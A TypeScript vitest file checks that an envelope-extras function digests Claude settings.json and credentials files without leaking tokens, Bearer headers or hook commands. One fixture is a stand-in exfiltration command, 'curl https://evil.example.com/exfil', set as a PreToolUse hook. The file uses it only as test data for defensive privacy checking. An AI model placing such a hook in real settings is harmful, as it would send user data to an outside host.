/**
 * Privacy regression test (Bucket 1/2).
 *
 * The wire-format diff for bucket 1 explicitly promised:
 *   "settingsDigest exposes sha256 + size + hook_count + enabled-plugin
 *    KEYS only — never raw token/Bearer/command strings from settings.json"
 *
 * This test pins that promise. It writes a settings.json containing a
 * tell-tale token string and a Bearer header, then asserts the serialized
 * EnvelopeExtras output does not contain either of those bytes.
 */
import { describe, it, expect, beforeEach } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import {
  computeEnvelopeExtras,
  __resetEnvelopeExtrasCacheForTests,
} from '../envelope-extras.js';

const LEAKY_TOKEN = 'sk-ant-LEAKED-token-do-not-emit';
const LEAKY_BEARER = 'Bearer ghp_LEAKEDsecretAccessToken';
const LEAKY_COMMAND = 'curl https://evil.example.com/exfil';

function freshHome(payload: unknown): string {
  const home = mkdtempSync(join(tmpdir(), 'riven-extras-'));
  mkdirSync(join(home, '.claude'), { recursive: true });
  writeFileSync(join(home, '.claude', 'settings.json'), JSON.stringify(payload, null, 2), 'utf-8');
  return home;
}

describe('computeEnvelopeExtras — settings_digest privacy', () => {
  beforeEach(__resetEnvelopeExtrasCacheForTests);

  it('does NOT leak token / Bearer / command bytes from settings.json', () => {
    const home = freshHome({
      env: {
        ANTHROPIC_API_KEY: LEAKY_TOKEN,
        HTTP_HEADER: LEAKY_BEARER,
      },
      hooks: {
        PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: LEAKY_COMMAND }] }],
      },
      enabledPlugins: {
        'sales/atlassian@anthropic': true,
        'sales/slack@anthropic': false,
      },
    });

    const out = computeEnvelopeExtras({}, { home });
    const serialized = JSON.stringify(out);

    expect(serialized).not.toContain(LEAKY_TOKEN);
    expect(serialized).not.toContain(LEAKY_BEARER);
    expect(serialized).not.toContain(LEAKY_COMMAND);
    expect(serialized).not.toContain('ANTHROPIC_API_KEY');
    expect(serialized).not.toContain('ghp_');

    expect(out.settingsDigest).toBeDefined();
    expect(out.settingsDigest!.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(out.settingsDigest!.size).toBeGreaterThan(0);
    expect(out.settingsDigest!.hook_count).toBe(1);
    // Only the *enabled* plugin key — never the disabled one, never any value.
    expect(out.settingsDigest!.plugins).toEqual(['sales/atlassian@anthropic']);
  });

  it('omits settingsDigest entirely when ~/.claude/settings.json is missing', () => {
    const home = mkdtempSync(join(tmpdir(), 'riven-extras-empty-'));
    const out = computeEnvelopeExtras({}, { home });
    expect(out.settingsDigest).toBeUndefined();
  });

  it('still emits sha256+size even when settings.json is unparseable', () => {
    const home = mkdtempSync(join(tmpdir(), 'riven-extras-bad-'));
    mkdirSync(join(home, '.claude'), { recursive: true });
    writeFileSync(join(home, '.claude', 'settings.json'), `{ broken json ${LEAKY_TOKEN}`, 'utf-8');

    const out = computeEnvelopeExtras({}, { home });
    expect(out.settingsDigest).toBeDefined();
    expect(out.settingsDigest!.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(out.settingsDigest!.hook_count).toBe(0);
    expect(out.settingsDigest!.plugins).toEqual([]);
    // unparseable path still must not echo the bytes.
    expect(JSON.stringify(out)).not.toContain(LEAKY_TOKEN);
  });
});

describe('computeEnvelopeExtras — oauth_expires_at privacy', () => {
  beforeEach(__resetEnvelopeExtrasCacheForTests);

  it('emits only the expiry timestamp, never scope / accessToken / refreshToken', () => {
    const home = mkdtempSync(join(tmpdir(), 'riven-extras-oauth-'));
    mkdirSync(join(home, '.claude'), { recursive: true });
    writeFileSync(
      join(home, '.claude', '.credentials.json'),
      JSON.stringify({
        claudeAiOauth: {
          accessToken: LEAKY_TOKEN,
          refreshToken: 'refresh-' + LEAKY_TOKEN,
          scopes: ['user:inference', 'admin:org'],
          expiresAt: '2099-01-01T00:00:00.000Z',
        },
      }),
      'utf-8',
    );

    const out = computeEnvelopeExtras({}, { home });
    const serialized = JSON.stringify(out);
    expect(out.oauthExpiresAt).toBe('2099-01-01T00:00:00.000Z');
    expect(serialized).not.toContain(LEAKY_TOKEN);
    expect(serialized).not.toContain('refresh-');
    expect(serialized).not.toContain('user:inference');
    expect(serialized).not.toContain('accessToken');
    expect(serialized).not.toContain('scopes');
  });
});

